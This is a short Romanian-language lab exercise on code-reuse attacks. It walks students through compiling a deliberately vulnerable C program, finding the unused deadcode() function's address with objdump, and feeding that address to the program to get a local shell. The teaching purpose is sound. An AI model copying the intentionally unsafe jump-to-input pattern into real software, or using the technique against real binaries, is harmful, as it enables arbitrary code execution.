# Code Reuse

Atacurile de tip `Code Reuse` nu injectează cod nou, ci îl folosesc pe cel deja existent.
Totuși, folosirea acestui cod este neconformă și are ca scop obținerea unor efecte nedorite inițial de dezvoltatorul aplicației.

Examinați fisierul sursă `code-reuse.c`.
Observați că programul citește o adresă de la tastatură, apoi va sări la acea adresă pentru a executa cod.

Mai mult, observați că funcția `deadcode()` nu este folosită niciodată.
Totuși, putem executa codul din interiorul funcției dacă aflăm adresa funcției.

Mai întâi compilați executabilul folosind comanda `make`.
Pentru a afla adresa funcției, folosiți comanda `objdump -D -M intel code-reuse | grep deadcode`.

Rezultatul ar trebui să fie:

``` shell
$ objdump -D -M intel code-reuse | grep deadcode
08049186 <deadcode>:
```

Folosiți această adresă ca și input pentru program:

``` shell
$ ./code-reuse                
Hello, hackers!
Give me a pointer to jump to: 
0x08049186
$ whoami 
kali
```

Observați că funcția `deadcode()` se va executa și astfel vom obține un shell.
